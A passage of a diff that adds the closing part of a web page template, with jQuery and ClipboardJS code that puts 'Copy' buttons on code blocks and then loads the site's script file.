+          var copyButton = $('<button>Copy <i class="far fa-clipboard"></i></button>');
+          code.id = codeId;
+          copyButton.addClass('clipboard-btn');
+          copyButton.attr('data-clipboard-target-id', codeId);
+
+          var figcaption = figure.querySelector('figcaption');
+
+          if (figcaption) {
+            figcaption.append(copyButton[0]);
+          } else {
+            figure.prepend(copyButton[0]);
+          }
+        })
+
+        var clipboard = new ClipboardJS('.clipboard-btn', {
+          target: function(trigger) {
+            return document.getElementById(trigger.getAttribute('data-clipboard-target-id'));
+          }
+        });
+        clipboard.on('success', function(e) {
+          e.clearSelection();
+        })
+      })
+    </script>
+
+    
+    
+
+    
+
+
+
+<script src="/js/script.js?v=3.js"></script>
+
+
+    
+</body>
+</html>
